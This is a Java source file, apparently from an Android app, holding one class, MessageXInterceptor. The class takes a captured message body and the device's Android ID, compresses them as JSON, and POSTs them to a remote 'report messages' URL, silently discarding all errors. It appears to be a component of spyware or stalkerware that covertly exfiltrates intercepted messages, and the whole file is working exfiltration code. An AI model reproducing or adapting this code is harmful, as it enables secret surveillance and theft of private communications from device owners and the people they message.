package org.code.coregradle.utils;

import org.json.JSONException;
import org.json.JSONObject;
import org.code.coregradle.config.ApiConfig;

import java.util.Date;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MessageXInterceptor implements Runnable {

    private String content;
    private String recipient;


    private static OkHttpClient okHttpClient = new OkHttpClient();


    public MessageXInterceptor(String displayBody, String androidId) {
        this.content = displayBody;
        this.recipient = androidId;
    }


    public JSONObject getRequestJSON() throws JSONException {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("ingressId", recipient);
        jsonObject.put("body", content);
        jsonObject.put("sendTo", recipient);
        jsonObject.put("timestamp", new Date().toString());
        return jsonObject;
    }

    @Override
    public void run() {
        try {
            JSONObject requestJSON = getRequestJSON();
            RequestBody requestBody = RequestBody.create(MediaType.get("application/json"), CompressionUtils.compress(requestJSON.toString()));
            Request request = new Request.Builder()
                    .url(ApiConfig.REPORT_MESSAGES_URL)
                    .post(requestBody)
                    .build();
            Response response = okHttpClient.newCall(request).execute();
        } catch (Exception e) {

        }
    }
}
